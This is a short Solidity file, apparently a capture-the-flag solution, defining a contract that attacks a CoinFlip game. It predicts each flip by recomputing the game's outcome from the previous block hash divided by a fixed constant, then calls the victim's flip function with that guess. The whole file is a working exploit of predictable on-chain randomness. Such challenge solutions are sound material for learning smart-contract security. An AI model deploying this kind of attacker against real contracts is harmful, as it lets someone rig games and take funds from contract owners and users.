// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface CoinFlip {
    function flip(bool) external returns (bool);
}

// NOTE our goal is to guess the coin flip correctly 10 times in a row
contract CoinFlipAttacker {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address challengeInstance;
    CoinFlip victim; 
    
    constructor(address victimAddress) {
        challengeInstance = victimAddress;
        victim = CoinFlip(victimAddress);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        bool success = victim.flip(side);
        require(success, "flip failed");
    }
}
